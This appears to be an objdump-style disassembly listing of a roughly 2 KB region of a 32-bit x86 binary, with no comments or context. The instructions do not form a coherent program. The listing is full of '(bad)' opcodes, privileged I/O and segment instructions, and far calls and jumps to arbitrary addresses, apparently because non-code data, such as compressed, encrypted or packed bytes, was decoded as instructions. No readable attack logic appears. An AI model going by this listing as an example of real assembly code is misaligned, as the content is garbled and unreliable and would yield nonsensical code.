  412100:	cli    
  412101:	bound  ecx,QWORD PTR [ebx+0xa284f6a]
  412107:	sti    
  412108:	stos   BYTE PTR es:[edi],al
  412109:	xor    al,0x5e
  41210b:	shl    ecx,cl
  41210d:	loopne 0x4120b4
  41210f:	stos   BYTE PTR es:[edi],al
  412110:	bound  esp,QWORD PTR [esi+0x77]
  412113:	pop    es
  412114:	adc    ebp,0x64
  412117:	std    
  412118:	leave  
  412119:	mov    edi,0x54f83506
  41211e:	inc    esi
  41211f:	mov    ds:0x3752299d,eax
  412124:	out    dx,al
  412125:	cdq    
  412126:	mov    al,0x21
  412128:	loope  0x412156
  41212a:	hlt    
  41212b:	push   ds
  41212c:	xchg   ecx,eax
  41212d:	imul   esi,DWORD PTR [esi-0x2bd322b3],0xffffffcd
  412134:	aam    0xfc
  412136:	jg     0x412128
  412138:	sti    
  412139:	sbb    edi,edi
  41213b:	fcom   DWORD PTR [eax+0x3ec01751]
  412141:	lea    esi,[esi]
  412143:	or     dl,BYTE PTR [eax]
  412145:	adc    DWORD PTR ds:0xce2e161d,0x78
  41214c:	fs ds push ebx
  41214f:	outs   dx,BYTE PTR ds:[esi]
  412150:	adc    BYTE PTR [edi+ebx*1],bl
  412153:	push   edx
  412154:	fadd   DWORD PTR [edx+0x25]
  412157:	add    eax,0xfd77c15d
  41215c:	test   al,0xe7
  41215e:	dec    esp
  41215f:	push   ebp
  412160:	mov    eax,ds:0x60fbfb70
  412165:	sbb    BYTE PTR [ebp+0x294d599e],ah
  41216b:	aam    0x68
  41216d:	or     BYTE PTR [ebp-0x3554c122],dh
  412173:	mov    edx,0x4fbeeb1a
  412178:	push   0x3e
  41217a:	xchg   DWORD PTR [ecx],esp
  41217c:	mov    edx,DWORD PTR [edx+0x15d913f1]
  412182:	or     esi,esp
  412184:	loope  0x41218e
  412186:	js     0x412207
  412188:	jnp    0x41212a
  41218a:	pop    ds
  41218b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41218c:	mov    cs,WORD PTR [esi+ecx*8-0x5542b730]
  412193:	jp     0x412168
  412195:	jae    0x41214f
  412197:	sahf   
  412198:	xchg   esi,eax
  412199:	daa    
  41219a:	sbb    BYTE PTR [esp-0x443bc5b5],0xcd
  4121a2:	push   ds
  4121a3:	pop    DWORD PTR [esi]
  4121a5:	sub    ch,BYTE PTR [ebp+0x53674a3]
  4121ab:	stos   BYTE PTR es:[edi],al
  4121ac:	add    esp,DWORD PTR ds:0xa388e7e6
  4121b2:	jbe    0x412175
  4121b4:	rcl    DWORD PTR [esi+ecx*2+0x2d7187bc],cl
  4121bb:	dec    ebx
  4121bc:	mov    dh,0x2b
  4121be:	add    eax,0xeb696d15
  4121c3:	pop    ecx
  4121c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4121c5:	cs scas al,BYTE PTR es:[edi]
  4121c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4121c8:	fucomip st,st(0)
  4121ca:	mov    edx,0x88448508
  4121cf:	fbstp  TBYTE PTR [ecx+0x33]
  4121d2:	mov    al,ds:0x3fe4643f
  4121d7:	(bad)  
  4121d8:	mov    ebp,0xa3cb8777
  4121dd:	iret   
  4121de:	add    al,0xe4
  4121e0:	out    0x3a,al
  4121e2:	inc    ebx
  4121e3:	and    edi,edx
  4121e5:	dec    ebx
  4121e6:	mov    ds,WORD PTR [edi+eax*1+0x589f184a]
  4121ed:	cmp    eax,0x20cf16f2
  4121f2:	pop    ss
  4121f3:	inc    edi
  4121f4:	(bad)
  4121f8:	sbb    BYTE PTR [ebx+0x4e],0x50
  4121fc:	pusha  
  4121fd:	ins    BYTE PTR es:[edi],dx
  4121fe:	dec    eax
  4121ff:	les    esp,FWORD PTR ds:0xac875150
  412205:	inc    esp
  412206:	mov    esi,0x68677652
  41220b:	(bad)  [edi+ecx*1+0x20]
  41220f:	xor    eax,0x90142db0
  412214:	(bad)  
  412215:	enter  0xc510,0xbb
  412219:	sbb    eax,0x9c0c47fb
  41221e:	shr    DWORD PTR [edi-0x4c],1
  412221:	pop    ebx
  412222:	repnz and al,0x73
  412225:	test   eax,0xd0df17ec
  41222a:	mov    edi,0xeef8b1a8
  41222f:	in     eax,dx
  412230:	mov    ds:0xf2713a11,eax
  412235:	call   0x7107843a
  41223a:	fdiv   QWORD PTR [eax]
  41223c:	sub    eax,0x59b10cac
  412241:	or     eax,0xd2111e75
  412246:	nop
  412247:	add    DWORD PTR [ebp+0x5],eax
  41224a:	sub    eax,0x5bdf42c6
  41224f:	jno    0x412214
  412251:	out    dx,al
  412252:	mov    ch,0x65
  412254:	std    
  412255:	jp     0x41221f
  412257:	inc    ecx
  412258:	call   DWORD PTR [eax-0x4d]
  41225b:	fs out 0xdf,al
  41225e:	arpl   WORD PTR es:[edx],bp
  412261:	mov    es,WORD PTR [eax+0xa]
  412264:	mov    edi,0xca8e10a2
  412269:	retf   0x709d
  41226c:	or     al,0x83
  41226e:	and    esp,0x7f
  412271:	inc    ebp
  412272:	out    0x4c,eax
  412274:	call   0x501fc6b8
  412279:	mov    esi,0x7d431d62
  41227e:	mov    edx,0x2bec574b
  412283:	cmp    BYTE PTR [edi-0x7d],ah
  412286:	data16 outs dx,BYTE PTR ds:[esi]
  412288:	pop    ebx
  412289:	hlt    
  41228a:	pop    edx
  41228b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41228c:	(bad)  
  41228d:	inc    edi
  41228e:	add    BYTE PTR [edx],0x95
  412291:	xor    edx,DWORD PTR [esi]
  412293:	(bad)  
  412294:	sub    BYTE PTR [ecx-0xa892956],dh
  41229a:	jnp    0x41230b
  41229c:	xor    eax,0x123be77a
  4122a1:	daa    
  4122a2:	add    ebx,esp
  4122a4:	mov    bh,0x13
  4122a6:	cdq    
  4122a7:	scas   eax,DWORD PTR es:[edi]
  4122a8:	sbb    al,dl
  4122aa:	jmp    0x85034123
  4122af:	adc    eax,0xcd35c1d9
  4122b4:	and    esp,eax
  4122b6:	bound  esp,QWORD PTR [ebx-0x12160818]
  4122bc:	aaa    
  4122bd:	xchg   DWORD PTR ds:0xb7a54e2e,esi
  4122c3:	les    eax,FWORD PTR [ebp-0x22]
  4122c6:	std    
  4122c7:	cs das 
  4122c9:	dec    edx
  4122ca:	pop    esi
  4122cb:	cmp    ecx,DWORD PTR [ebp-0x329825cb]
  4122d1:	rcl    DWORD PTR [ebx-0x17],0x81
  4122d5:	pop    edx
  4122d6:	shr    BYTE PTR [eax],cl
  4122d8:	imul   esi,DWORD PTR [ecx-0x72],0xc1e796e6
  4122df:	fidiv  WORD PTR [ecx]
  4122e1:	bound  ecx,QWORD PTR [ebp+eax*1-0x2]
  4122e5:	or     al,0x5c
  4122e7:	mov    ecx,eax
  4122e9:	dec    ebx
  4122ea:	fnstsw WORD PTR [edx]
  4122ec:	test   DWORD PTR [ecx+0x71],0xcd6fda40
  4122f3:	shr    DWORD PTR ss:[edx],1
  4122f6:	lods   eax,DWORD PTR ds:[esi]
  4122f7:	dec    esp
  4122f8:	sar    DWORD PTR [edi+0x11],cl
  4122fb:	mov    BYTE PTR [esi-0x5e],ah
  4122fe:	jp     0x412289
  412300:	jp     0x4122f3
  412302:	fwait
  412303:	sub    edi,edx
  412305:	mov    bl,0x1d
  412307:	mov    dl,0x9f
  412309:	jns    0x412291
  41230b:	xor    BYTE PTR [esi+0x4d],ah
  41230e:	(bad)  
  41230f:	rcr    BYTE PTR [eax],0xc4
  412312:	out    dx,al
  412313:	push   ebp
  412314:	push   0x4dfa8fd6
  412319:	not    ch
  41231b:	rcr    DWORD PTR [eax],0xb7
  41231e:	fstp   QWORD PTR [edi]
  412320:	mov    dh,0x84
  412322:	adc    edx,esi
  412324:	stos   DWORD PTR es:[edi],eax
  412325:	out    dx,eax
  412326:	jae    0x412360
  412328:	push   ss
  412329:	mov    al,0x4d
  41232b:	loopne 0x41234f
  41232d:	mov    bl,0x99
  41232f:	dec    ebp
  412330:	and    al,0x12
  412332:	loope  0x4122cf
  412334:	cmp    edx,esp
  412336:	cld    
  412337:	xchg   edi,eax
  412338:	fistp  WORD PTR [ebx-0xe]
  41233b:	call   0x4ae:0x854ce421
  412342:	sub    al,0x2c
  412344:	pop    esi
  412345:	in     eax,0x37
  412347:	inc    esp
  412348:	jb     0x4123c6
  41234a:	(bad)  [eax-0x30]
  41234d:	xchg   ebx,eax
  41234e:	popa   
  41234f:	in     al,dx
  412350:	cmp    al,0xca
  412352:	or     DWORD PTR [esi+0x46],0xd1b17144
  412359:	ret    0x53c4
  41235c:	mov    al,ds:0xfa1323a7
  412361:	pop    ecx
  412362:	or     eax,0x2b26bfbd
  412367:	inc    eax
  412368:	ss into 
  41236a:	xchg   ecx,eax
  41236b:	aas    
  41236c:	jo     0x412374
  41236e:	push   0xd1d77eef
  412373:	pop    esp
  412374:	outs   dx,DWORD PTR ds:[esi]
  412375:	xor    eax,0xfd3abc8f
  41237a:	pop    ebx
  41237b:	fidiv  DWORD PTR [edx-0x24957be2]
  412381:	test   al,0xa5
  412383:	scas   al,BYTE PTR es:[edi]
  412384:	mov    esi,esi
  412386:	mov    ecx,0xa7dcc052
  41238b:	sbb    al,0x2a
  41238d:	pop    ebp
  41238e:	std    
  41238f:	and    al,0xf8
  412391:	dec    esp
  412392:	cld    
  412393:	mov    edx,0x4fc5daf
  412398:	sbb    eax,0x4b44b45c
  41239d:	push   edx
  41239e:	test   DWORD PTR [edi+0x28],0x66c246a5
  4123a5:	xchg   ebx,eax
  4123a6:	and    al,0x34
  4123a8:	sbb    eax,0x44d08267
  4123ad:	stos   BYTE PTR es:[edi],al
  4123ae:	push   0x70bbe53e
  4123b3:	mov    ah,0xaf
  4123b5:	(bad)  
  4123b7:	shl    BYTE PTR [eax-0x5cfc01fe],1
  4123bd:	add    DWORD PTR [ebx+ebp*1-0x39742f9b],ecx
  4123c4:	jo     0x412441
  4123c6:	sbb    al,0xc8
  4123c8:	add    ax,0xeda8
  4123cc:	and    eax,0xe610b8ec
  4123d1:	clc    
  4123d2:	mov    dl,0x7
  4123d4:	inc    edx
  4123d5:	jno    0x412366
  4123d7:	mov    eax,0x4a10510f
  4123dc:	xchg   edi,eax
  4123dd:	push   edi
  4123de:	mov    bl,dl
  4123e0:	fsubr  QWORD PTR [ebx-0x2954a36]
  4123e6:	pop    es
  4123e7:	push   cs
  4123e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4123e9:	xchg   edx,eax
  4123ea:	clc    
  4123eb:	(bad)  
  4123ec:	ret    
  4123ed:	jmp    0x412459
  4123ef:	push   esp
  4123f0:	sar    BYTE PTR [edi+ecx*1+0x3],1
  4123f4:	lea    esi,[ecx+ebx*4-0x6]
  4123f8:	leave  
  4123f9:	add    bl,BYTE PTR [esp+esi*2+0x13]
  4123fd:	sbb    BYTE PTR [esi-0x4f1592c2],0x1f
  412404:	add    al,BYTE PTR [esi]
  412406:	pop    esp
  412407:	dec    eax
  412408:	test   bh,ah
  41240a:	aas    
  41240b:	fiadd  WORD PTR [ecx+0x267959cb]
  412411:	cmp    ah,BYTE PTR [ebp+eiz*4+0x270c8001]
  412418:	add    DWORD PTR [ebx+eiz*4+0x6c],edx
  41241c:	pusha  
  41241d:	inc    eax
  41241e:	pop    edi
  41241f:	out    0xe8,eax
  412421:	adc    bl,BYTE PTR [ecx]
  412423:	fsubr  DWORD PTR [ebx+0x931ba]
  412429:	add    DWORD PTR [eax-0x5520d046],esi
  41242f:	ds xor esi,ebx
  412432:	push   ebx
  412433:	icebp  
  412434:	push   0x40d51144
  412439:	rcl    DWORD PTR [eax+ecx*8-0x24],cl
  41243d:	add    dl,ch
  41243f:	pop    ss
  412440:	mov    al,ds:0xf68c1f05
  412445:	cwde   
  412446:	jno    0x4124a6
  412448:	pushf  
  412449:	push   ecx
  41244a:	mov    ds,WORD PTR [edx+0x61f683e6]
  412450:	(bad)  
  412451:	test   DWORD PTR [ecx],0xc9134fc9
  412457:	add    al,0x3b
  412459:	outs   dx,BYTE PTR ds:[esi]
  41245a:	dec    ebx
  41245b:	xlat   BYTE PTR ds:[ebx]
  41245c:	popf   
  41245d:	rol    esi,1
  41245f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412460:	jl     0x412485
  412462:	sub    eax,0x4d2570f6
  412467:	push   ds
  412468:	(bad)  
  412469:	aad    0x7c
  41246b:	pop    ds
  41246c:	jne    0x4124b7
  41246e:	mov    WORD PTR [ebp+0x7],gs
  412471:	push   ebx
  412472:	pop    esi
  412473:	in     al,dx
  412474:	out    dx,al
  412475:	lods   eax,DWORD PTR ds:[esi]
  412476:	inc    esp
  412477:	xchg   DWORD PTR [edx*1-0x680c5371],ebx
  41247e:	xchg   edi,eax
  41247f:	sbb    al,0xc0
  412481:	sub    edi,DWORD PTR [ebx]
  412483:	imul   ebx,DWORD PTR [edx],0xffffffba
  412486:	mov    al,0xa5
  412488:	aad    0xb4
  41248a:	cmp    DWORD PTR [eax+edi*4-0x72],esp
  41248e:	hlt    
  41248f:	and    al,0x1f
  412491:	icebp  
  412492:	cmp    DWORD PTR [edx+0x3dfb9e9c],eax
  412498:	out    0x6,al
  41249a:	push   esp
  41249b:	(bad)
  41249e:	and    al,0x68
  4124a0:	sbb    bh,cl
  4124a2:	xchg   edx,eax
  4124a3:	jmp    0x412469
  4124a5:	xor    DWORD PTR [ebp+0x36],esi
  4124a8:	mov    ch,0x78
  4124aa:	out    0xfe,eax
  4124ac:	mov    edx,0xafff6fde
  4124b1:	xlat   BYTE PTR ds:[ebx]
  4124b2:	imul   ebx,DWORD PTR [ecx+0x5b7a963a],0xf
  4124b9:	call   0x255cc749
  4124be:	inc    esp
  4124bf:	lea    edx,[esi+ebx*8+0x40]
  4124c3:	popf   
  4124c4:	xor    DWORD PTR [esi],edx
  4124c6:	mov    ebx,0x661863ea
  4124cb:	dec    edx
  4124cc:	mov    ecx,0xb2cc79c2
  4124d1:	add    ebp,eax
  4124d3:	adc    BYTE PTR [ecx+0x658f2a77],cl
  4124d9:	es sti 
  4124db:	add    bl,0xb3
  4124de:	test   eax,0x9be3b66b
  4124e3:	xor    DWORD PTR ds:0x1cb1471a,ecx
  4124e9:	and    cl,BYTE PTR [edx+ecx*8+0x68]
  4124ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4124ee:	aad    0x99
  4124f0:	xchg   esi,eax
  4124f1:	pushf  
  4124f2:	mov    edi,0xbb278300
  4124f7:	cwde   
  4124f8:	sbb    DWORD PTR [eax-0x2a],ecx
  4124fb:	fldlg2 
  4124fd:	mov    bl,0x4c
  4124ff:	pop    ds
  412500:	fnstcw WORD PTR [eax+0x1f]
  412503:	sti    
  412504:	adc    al,0xa1
  412506:	sti    
  412507:	pushf  
  412508:	(bad)  
  412509:	ins    DWORD PTR es:[edi],dx
  41250a:	or     cl,BYTE PTR [edx]
  41250c:	int3   
  41250d:	sti    
  41250e:	lods   eax,DWORD PTR es:[esi]
  412510:	sti    
  412511:	stos   BYTE PTR es:[edi],al
  412512:	call   0x54aa:0xc609726c
  412519:	fsub   DWORD PTR [ebx]
  41251b:	cmc    
  41251c:	faddp  st(3),st
  41251e:	push   0x18
  412520:	mov    bl,0xa9
  412522:	pop    eax
  412523:	and    BYTE PTR [esp+ebp*2-0x5e1ea57b],bh
  41252a:	dec    edi
  41252b:	add    edi,DWORD PTR [ecx]
  41252d:	test   DWORD PTR [esi+0x2c],edi
  412530:	jmp    0x4124ee
  412532:	xchg   BYTE PTR [edi-0x73],ch
  412535:	push   0x5e
  412537:	call   0x7599:0xb642b1e0
  41253e:	clc    
  41253f:	sar    BYTE PTR [edx+0x75c07dcb],0xf9
  412546:	fidiv  WORD PTR [eax+0x550f58f4]
  41254c:	xchg   esi,eax
  41254d:	repnz push edx
  41254f:	mul    ch
  412551:	mov    edi,0x2487263d
  412556:	aaa    
  412557:	add    eax,0x3b7896bf
  41255c:	mov    fs,WORD PTR [edx+ebp*2-0x35]
  412560:	or     dh,BYTE PTR [esi]
  412562:	or     esi,esi
  412564:	fcom   QWORD PTR [eax+0x6f6da503]
  41256a:	pop    esi
  41256b:	mov    ah,0x55
  41256d:	fwait
  41256e:	dec    esi
  41256f:	sub    eax,DWORD PTR [edi+0x20482285]
  412575:	pop    edi
  412576:	lea    esi,[ebx+0x58]
  412579:	mov    esi,0x100dc0c4
  41257e:	push   ss
  41257f:	mov    ?,edx
  412581:	aad    0x9f
  412583:	gs loop 0x412513
  412586:	or     al,ch
  412588:	xor    al,0x2d
  41258a:	mov    gs,WORD PTR ds:0x91454c6
  412590:	(bad)  
  412591:	push   ecx
  412592:	arpl   WORD PTR [eax],sp
  412594:	cmp    edi,DWORD PTR [ebp-0x5a]
  412597:	in     al,0xa2
  412599:	pop    edi
  41259a:	mov    cl,0x82
  41259c:	ins    DWORD PTR es:[edi],dx
  41259d:	pop    ebp
  41259e:	pushf  
  41259f:	dec    ebx
  4125a0:	xor    BYTE PTR [eax],ch
  4125a2:	fiadd  DWORD PTR [ebp-0x46e69a46]
  4125a8:	je     0x412615
  4125aa:	xlat   BYTE PTR ds:[ebx]
  4125ab:	jno    0x412559
  4125ad:	fcomp  QWORD PTR [ebp+0x34748281]
  4125b3:	sub    al,0xa6
  4125b5:	mov    ebp,0x6804ba0b
  4125ba:	xchg   DWORD PTR [ebx],eax
  4125bc:	and    al,0xbd
  4125be:	mov    DWORD PTR [ebx+0x32],ebx
  4125c1:	jnp    0x412622
  4125c3:	inc    ebp
  4125c4:	enter  0x6c90,0xb7
  4125c8:	fiadd  DWORD PTR ds:0x12cd2d33
  4125ce:	leave  
  4125cf:	xchg   edx,eax
  4125d0:	les    ebp,FWORD PTR [edi+ebx*8+0xded3308]
  4125d7:	jns    0x412573
  4125d9:	ins    BYTE PTR es:[edi],dx
  4125da:	jmp    0xc1ef:0x83fc1b18
  4125e1:	mov    dh,BYTE PTR ds:0xd80f9925
  4125e7:	sbb    ebx,DWORD PTR ds:0x3ef4226
  4125ed:	dec    ebp
  4125ee:	push   es
  4125ef:	hlt    
  4125f0:	xor    eax,0x7f0c84eb
  4125f5:	js     0x41266b
  4125f7:	pop    esi
  4125f8:	shr    eax,1
  4125fa:	xchg   esp,eax
  4125fb:	sub    al,BYTE PTR [ecx+eax*4]
  4125fe:	addr16 (bad) 
  412600:	jg     0x41263f
  412602:	pushf  
  412603:	pop    ecx
  412604:	or     dh,BYTE PTR [esi+0x76]
  412607:	ffreep st(4)
  412609:	xchg   eax,edi
  41260b:	jmp    0x2aeb:0x9e62c60b
  412612:	div    dl
  412614:	and    ebp,DWORD PTR ds:0x7c75bc67
  41261a:	mov    ebx,0xdd13e80c
  41261f:	push   ecx
  412620:	lea    ebx,ds:0x74e9f3f2
  412626:	mov    cl,0xa4
  412628:	mov    al,0x5f
  41262a:	dec    edi
  41262b:	inc    ecx
  41262c:	adc    dh,ch
  41262e:	ret    0xc3fe
  412631:	sub    BYTE PTR [eax-0x2e],cl
  412634:	ss xchg ebp,eax
  412636:	cmp    al,0xa1
  412638:	ja     0x412622
  41263a:	leave  
  41263b:	sbb    bh,BYTE PTR [esi-0x1c7c7d58]
  412641:	bound  edx,QWORD PTR [esi]
  412643:	dec    ecx
  412644:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412645:	inc    edx
  412646:	jo     0x4125d9
  412648:	pop    esi
  412649:	ins    DWORD PTR es:[edi],dx
  41264a:	and    al,0xae
  41264c:	fild   QWORD PTR ds:0xf0bbe427
  412652:	sbb    esi,eax
  412654:	aad    0xe1
  412656:	push   esp
  412657:	sub    BYTE PTR [eax-0x7dda4dc0],dl
  41265d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41265e:	add    BYTE PTR [ecx],al
  412660:	pushaw 
  412662:	pop    ebp
  412663:	cmp    DWORD PTR [bx+si-0x50],0x852e9220
  41266b:	push   es
  41266c:	or     al,0x90
  41266e:	sub    BYTE PTR [ecx+ecx*4+0x4ae93be0],0x73
  412676:	imul   ecx,DWORD PTR [eax+ebx*8-0x54],0x2a
  41267b:	mov    eax,ds:0x3921aea2
  412680:	pop    ebx
  412681:	jbe    0x412701
  412683:	sub    cl,BYTE PTR [edx-0x75]
  412686:	in     al,dx
  412687:	adc    BYTE PTR fs:[esi+0x1f71b844],al
  41268e:	cld    
  41268f:	push   ebx
  412690:	push   edx
  412691:	cmp    eax,0xd0b93eff
  412696:	pop    ds
  412697:	inc    edx
  412698:	gs inc ecx
  41269a:	jp     0x4126f3
  41269c:	mov    al,ds:0xff08e5f1
  4126a1:	in     al,0x92
  4126a3:	or     BYTE PTR [eax+0x2af5a9cb],ah
  4126a9:	shl    BYTE PTR ds:0x1388000,cl
  4126af:	mov    edi,0x94340766
  4126b4:	sub    dl,cl
  4126b6:	mov    esp,ebp
  4126b8:	adc    DWORD PTR [ebx+0x2f],edx
  4126bb:	mov    DWORD PTR [eax+0x5c],0xd505705
  4126c2:	xchg   BYTE PTR ds:0x6ede19f8,ah
  4126c8:	push   ebx
  4126c9:	aaa    
  4126ca:	shr    DWORD PTR [ebx+0x476da394],0xb0
  4126d1:	int3   
  4126d2:	xchg   ebx,eax
  4126d3:	arpl   WORD PTR [esi-0x60022b89],si
  4126d9:	add    al,0xe
  4126db:	mov    cl,0x6a
  4126dd:	fdivr  QWORD PTR [esi+edx*1-0x1b]
  4126e1:	xchg   dl,ch
  4126e3:	fbstp  TBYTE PTR [eax+0x65]
  4126e6:	push   eax
  4126e7:	pop    ss
  4126e8:	cmp    BYTE PTR [esi],dl
  4126ea:	pop    esi
  4126eb:	dec    ebp
  4126ec:	pop    es
  4126ed:	lods   eax,DWORD PTR ds:[esi]
  4126ee:	loopne 0x41274a
  4126f0:	in     al,0x96
  4126f2:	ret    
  4126f3:	or     cl,al
  4126f5:	xor    BYTE PTR [edx],ah
  4126f7:	push   esp
  4126f8:	mov    dh,bl
  4126fa:	in     al,0xa6
  4126fc:	lods   eax,DWORD PTR ds:[esi]
  4126fd:	lods   eax,DWORD PTR ds:[esi]
  4126fe:	ds popa 
  412700:	test   al,0x4d
  412702:	cmp    DWORD PTR [edx],0x34
  412705:	mov    bh,0x29
  412707:	mov    edi,0x68e0e72
  41270c:	adc    eax,edx
  41270e:	mov    BYTE PTR [eax+ebx*8-0x5245dac9],dh
  412715:	pop    edi
  412716:	xchg   ebp,eax
  412717:	rcl    bl,cl
  412719:	enter  0xc32d,0x13
  41271d:	pop    ecx
  41271e:	adc    eax,0xe9a84b49
  412723:	dec    ebx
  412724:	mov    WORD PTR [eax+0x63],es
  412727:	fwait
  412728:	sub    BYTE PTR [ecx+0x1e10550],al
  41272e:	dec    edx
  41272f:	sahf   
  412730:	push   cs
  412731:	dec    edi
  412732:	imul   eax,DWORD PTR [ecx+0x6192ee77],0x43
  412739:	add    ch,dh
  41273b:	xlat   BYTE PTR ds:[ebx]
  41273c:	mov    ds:0xa9fe2a9,eax
  412741:	js     0x4126d2
  412743:	loop   0x4126ec
  412745:	pusha  
  412746:	mov    bl,0x87
  412748:	mov    cl,0xb8
  41274a:	in     eax,0xbf
  41274c:	mov    al,0xb
  41274e:	xor    eax,0x94ff095b
  412753:	push   ebx
  412754:	int3   
  412755:	ins    DWORD PTR es:[edi],dx
  412756:	(bad)  
  412757:	ret    0x98b1
  41275a:	add    esi,DWORD PTR [ebx+0x1d463e2f]
  412760:	sbb    esp,DWORD PTR [edx-0x15]
  412763:	sahf   
  412764:	push   esp
  412765:	sbb    cl,cl
  412767:	inc    esp
  412768:	push   edi
  412769:	hlt    
  41276a:	stc    
  41276b:	xchg   edx,eax
  41276c:	sar    DWORD PTR [ebx-0x31],1
  41276f:	mov    WORD PTR [edx+0x6d17e4b5],gs
  412775:	or     ecx,0xe92a9f54
  41277b:	mov    eax,ds:0x54f75a9e
  412780:	ret    0x6584
  412783:	dec    edi
  412785:	or     eax,ebp
  412787:	mov    edx,0x878e787c
  41278c:	adc    edi,DWORD PTR [esi+0x70]
  41278f:	lds    edi,FWORD PTR [edi-0x30]
  412792:	retf   0x5f5b
  412795:	adc    DWORD PTR [esi-0x48],ecx
  412798:	cmp    cl,al
  41279a:	pop    ecx
  41279b:	out    dx,al
  41279c:	mov    eax,ds:0x458434c4
  4127a1:	sbb    al,0xff
  4127a3:	xchg   esi,eax
  4127a4:	pushf  
  4127a5:	dec    ebx
  4127a6:	jo     0x4127c0
  4127a8:	stos   DWORD PTR es:[edi],eax
  4127a9:	clc    
  4127aa:	shl    cl,1
  4127ac:	push   es
  4127ad:	mov    ds:0x63611ec8,al
  4127b2:	shl    BYTE PTR [ebx],0x7e
  4127b5:	xor    cl,ah
  4127b7:	fidiv  DWORD PTR [esp+eax*8+0x62]
  4127bb:	push   edx
  4127bc:	sahf   
  4127bd:	add    edi,esi
  4127bf:	bnd jns 0x41280f
  4127c2:	inc    esp
  4127c3:	and    al,0x45
  4127c5:	std    
  4127c6:	cs sbb al,ah
  4127c9:	jecxz  0x412800
  4127cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4127cc:	or     eax,0x30d9d2c8
  4127d1:	lea    edx,[ebx+0x3d0faa19]
  4127d7:	loopne 0x412793
  4127d9:	add    DWORD PTR [eax],0x82ac7e92
  4127df:	push   ebp
  4127e0:	adc    eax,0xb01aa6c6
  4127e5:	div    DWORD PTR [ebp+0x32]
  4127e8:	loope  0x412799
  4127ea:	mov    ecx,0x6707d969
  4127ef:	xchg   ebx,eax
  4127f0:	pushf  
  4127f1:	pop    eax
  4127f2:	mov    ecx,0xc0c5c40
  4127f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4127f8:	fadd   QWORD PTR [ebx+edi*4-0xc]
  4127fc:	popf   
  4127fd:	shl    BYTE PTR [esi-0x37],0x57
  412801:	in     al,dx
  412802:	push   esi
  412803:	push   ebx
  412804:	adc    eax,DWORD PTR [ecx]
  412806:	xor    BYTE PTR [edx],bl
  412808:	ins    BYTE PTR es:[edi],dx
  412809:	sbb    al,BYTE PTR [eax]
  41280b:	ficomp DWORD PTR es:[ecx+0x53]
  41280f:	stos   DWORD PTR es:[edi],eax
  412810:	jge    0x4127b2
  412812:	push   ds
  412813:	cli    
  412814:	add    BYTE PTR cs:[edi-0x70],dh
  412818:	lds    edi,FWORD PTR [ebp+esi*2-0x9]
  41281c:	bound  ebx,QWORD PTR [ebx+0x13]
  41281f:	ja     0x41280d
  412821:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412822:	or     cl,BYTE PTR [eax+0x50]
  412825:	dec    edi
  412826:	mov    WORD PTR [eax+0x20],es
  412829:	retf   0x5c32
  41282c:	jl     0x41283e
  41282e:	mov    edx,fs
  412830:	(bad)
  412834:	push   edi
  412835:	push   esi
  412836:	xor    eax,0xd368307d
  41283b:	push   ss
  41283c:	jmp    0x4128a2
  41283e:	mov    eax,0x1c7eabbd
  412843:	sahf   
  412844:	ret    
  412845:	inc    esi
  412846:	xchg   ecx,eax
  412847:	mov    ss,WORD PTR [edx-0x2fc4dcb0]
  41284d:	add    eax,0xb504a54
  412852:	pop    ds
  412853:	xor    edx,DWORD PTR [ebp+0x603c1e37]
  412859:	rcr    BYTE PTR [edi],cl
  41285b:	or     al,0x22
  41285d:	les    edx,FWORD PTR [ecx]
  41285f:	dec    ebp
  412860:	dec    edi
  412861:	fwait
  412862:	mov    ah,0xad
  412864:	dec    edi
  412865:	jns    0x4128e6
  412867:	and    ecx,DWORD PTR [ebx+0x2617c6a0]
  41286d:	imul   esp,ecx,0xffffffcd
  412870:	or     DWORD PTR [edi+0x5286031d],ecx
  412876:	call   0xda37:0x2c4da991
  41287d:	sbb    bh,ch
  41287f:	mov    WORD PTR [esi+eax*1+0x28],?
  412883:	sbb    ebp,DWORD PTR [eax-0x1c]
  412886:	inc    edi
  412887:	jle    0x4128d9
  412889:	dec    esi
  41288a:	js     0x412856
  41288c:	mov    al,BYTE PTR [ebx]
  41288e:	and    ah,BYTE PTR [ecx]
  412890:	scas   al,BYTE PTR es:[edi]
  412891:	(bad)  [ebx-0x157a3a73]
  412897:	mov    edx,0xf423840f
  41289c:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  41289e:	ss add al,0xda
  4128a1:	cmp    edi,esp
  4128a3:	mov    ebx,0x663b19ae
  4128a8:	jmp    0x4128ec
  4128aa:	add    al,0x48
  4128ac:	scas   al,BYTE PTR es:[edi]
  4128ad:	jg     0x412839
  4128af:	cs push edx
  4128b1:	sbb    ch,ah
  4128b3:	push   ebp
  4128b4:	aas    
  4128b5:	pop    edx
  4128b6:	push   ebx
  4128b7:	repz push ebx
  4128b9:	or     cl,bl
  4128bb:	jge    0x41288c
  4128bd:	sti    
  4128be:	gs int 0x1a
  4128c1:	add    ch,BYTE PTR [ebp-0x1d]
  4128c4:	dec    esi
  4128c5:	sub    ebx,ecx
  4128c7:	jmp    0xc7121095
  4128cc:	push   0xffffff8d
  4128ce:	in     al,0x2d
  4128d0:	mov    DWORD PTR [ecx+0x63],ebx
  4128d3:	repz fdivr QWORD PTR [eax+0xf]
  4128d7:	jae    0x4128fe
  4128d9:	jno    0x4128e6
  4128db:	or     bl,ah
  4128dd:	and    DWORD PTR [edx],0xffffffa7
  4128e0:	xchg   edx,eax
  4128e1:	mov    ebp,DWORD PTR fs:[esi-0x61b2230]
  4128e8:	sar    eax,cl
  4128ea:	or     edi,ebx
  4128ec:	gs je  0x4128aa
  4128ef:	pop    ebp
  4128f0:	aad    0x64
  4128f2:	dec    edi
  4128f3:	jae    0x4128e3
  4128f5:	mov    esi,0xbf9c07c0
  4128fa:	test   BYTE PTR [edx],cl
  4128fc:	xchg   esi,eax
